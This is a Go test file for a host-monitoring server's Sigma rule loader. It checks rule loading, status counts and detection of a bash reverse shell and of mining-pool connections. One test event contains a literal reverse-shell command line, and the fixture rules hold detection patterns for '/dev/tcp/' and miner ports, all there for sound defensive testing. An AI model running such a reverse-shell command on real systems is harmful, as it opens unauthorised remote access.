package server

import (
	"os"
	"testing"
)

func TestSigmaRulesInServer(t *testing.T) {
	dir := t.TempDir()
	os.MkdirAll(dir+"/linux", 0o755)
	os.WriteFile(dir+"/linux/rev.yml", []byte(`title: Bash Reverse Shell
id: 11111111-2222-3333-4444-555555555555
tags: [attack.execution, attack.t1059.004]
logsource:
  product: linux
  category: process_creation
detection:
  sel:
    CommandLine|contains|all: [' -i ', '/dev/tcp/']
  condition: sel
level: critical
`), 0o644)
	os.WriteFile(dir+"/linux/net.yml", []byte(`title: Connection To Mining Pool Port
logsource:
  product: linux
  category: network_connection
detection:
  sel:
    DestinationPort:
      - 3333
      - 14444
  condition: sel
level: high
---
title: Windows Thing
logsource:
  product: windows
  category: process_creation
detection:
  sel:
    Image: x
  condition: sel
---
title: Unknown Field
logsource:
  product: linux
  category: process_creation
detection:
  sel:
    Hashes: abc
  condition: sel
`), 0o644)
	n, errs := LoadSigma(dir)
	defer LoadSigma("")
	if n != 2 || len(errs) != 1 {
		t.Fatalf("loaded %d %v", n, errs)
	}
	if st := sigmaStatus(); st["other_sources"] != 1 {
		t.Fatalf("status: %v", st)
	}
	s := forensicServer(t)
	a := s.state.Agents["a1"]
	rec := &Record{Agent: "a1", Event: protoEvent("process.exec", map[string]any{"exe": "/usr/bin/bash", "cmdline": "bash -i >& /dev/tcp/1.2.3.4/1 0>&1", "uid": 0.0})}
	fs := s.evaluateSigma(a, rec)
	if len(fs) != 1 || fs[0].Rule != "sigma.bash_reverse_shell.11111111" {
		t.Fatalf("findings: %+v", fs)
	}
	def, ok := lookupRule(fs[0].Rule)
	if !ok || def.Severity != "critical" || def.Technique != "T1059.004" || renderTitle(fs[0].Rule, fs[0].Params, "en") != "Sigma: Bash Reverse Shell (/usr/bin/bash)" {
		t.Fatalf("def %+v %s", def, renderTitle(fs[0].Rule, fs[0].Params, "en"))
	}
	if fs := s.evaluateSigma(a, &Record{Agent: "a1", Event: protoEvent("net.connection", map[string]any{"remote_ip": "1.2.3.4", "remote_port": 3333.0, "exe": "/tmp/x"})}); len(fs) != 1 {
		t.Fatalf("network: %+v", fs)
	}
	if fs := s.evaluateSigma(a, &Record{Agent: "a1", Event: protoEvent("net.connection", map[string]any{"remote_ip": "1.2.3.4", "remote_port": 443.0})}); len(fs) != 0 {
		t.Fatal("port 443")
	}
	if n, errs := LoadSigma(dir); n != 2 || errs != nil {
		t.Fatalf("reload: %d %v", n, errs)
	}
}

// TestSigmaHQServer loads the SigmaHQ Linux rules into the server:
//
//	VIGIL_SIGMAHQ=/path/to/sigma/rules/linux go test ./internal/server -run SigmaHQServer -v
func TestSigmaHQServer(t *testing.T) {
	dir := os.Getenv("VIGIL_SIGMAHQ")
	if dir == "" {
		t.Skip("set VIGIL_SIGMAHQ")
	}
	n, errs := LoadSigma(dir)
	defer LoadSigma("")
	t.Logf("active %d, status %v", n, sigmaStatus()["other_sources"])
	for _, e := range errs {
		t.Log(e)
	}
}
